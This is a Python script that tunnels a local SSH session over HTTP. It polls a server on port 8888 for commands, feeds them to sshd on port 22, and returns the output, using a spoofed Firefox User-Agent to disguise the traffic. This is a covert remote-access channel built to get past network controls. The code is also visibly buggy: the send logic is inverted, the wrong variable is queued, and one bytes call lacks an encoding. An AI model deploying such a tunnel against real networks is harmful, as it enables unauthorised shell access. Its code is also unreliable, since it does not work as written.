PORT_SSHD = 22
MAX_LENGTH = 4096
closed = True
ADDRESS_SSHD = "localhost"
ADDRESS_SERVER = "localhost"
PORT_SERVER = "8888"
TRY_CONNECTION_MESSAGE = 'TRY_CONNECTION'
CLOSE_SOCKET_MESSAGE = 'TO_CLOSE'
OPEN_SOCKET_MESSAGE = 'TO_OPEN'
ASK_COMMAND_MESSAGE = 'WAITING_FOR_COMMAND'
EMPTY_MESSAGE = 'BLANK'
import socket
import sys
import urllib.request
import urllib.error
import urllib.parse
import time
from multiprocessing import Queue, Process
def threadSSH(queueIn, queueOut):
    toReceive = None
    tmp = None
    sock = socket.socket()
    sock.connect((ADDRESS_SSHD,PORT_SSHD))
    sock.setblocking(False)
    while True :
        time.sleep(1)
        if not(queueIn.empty()) or tmp != None :
            #try :
                if (tmp != None) :
                    tmp = queueIn.get()
                sock.send(tmp)
                tmp = None
            #except BlockingIOError as e :

        try :
            toReceive = sock.recv(MAX_LENGTH)
        except BlockingIOError as e :
            print ("error :" + str(e))
            toReceive = None
        if toReceive != None:
            queueOut.put(toSend)

content = ''
toSend = bytes(ASK_COMMAND_MESSAGE, 'UTF-8')
data = toSend
if __name__== '__main__':
    q = Queue()
    qo = Queue()
    p = Process(target=threadSSH, args=(q,qo,))
    p.start()
    while True :
        time.sleep(1)
        data = toSend
        req = urllib.request.Request('http://'+ADDRESS_SERVER+':'+PORT_SERVER, data)
        req.add_header('Content-Length', len(data))
        req.add_header('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.3.0')
        req.add_header('Content-Type', 'application/octet-stream')
        try :
            print("openning : " + str(req))
            res = urllib.request.urlopen(req)
            content = res.read().decode('UTF-8')
        except (urllib.error.HTTPError, urllib.error.URLError) as e :
            continue
        if str(content) != EMPTY_MESSAGE :
            q.put(content)
        if qo.empty() :
            toSend = bytes(ASK_COMMAND_MESSAGE)
        else :
            toSend = bytes(qo.get())
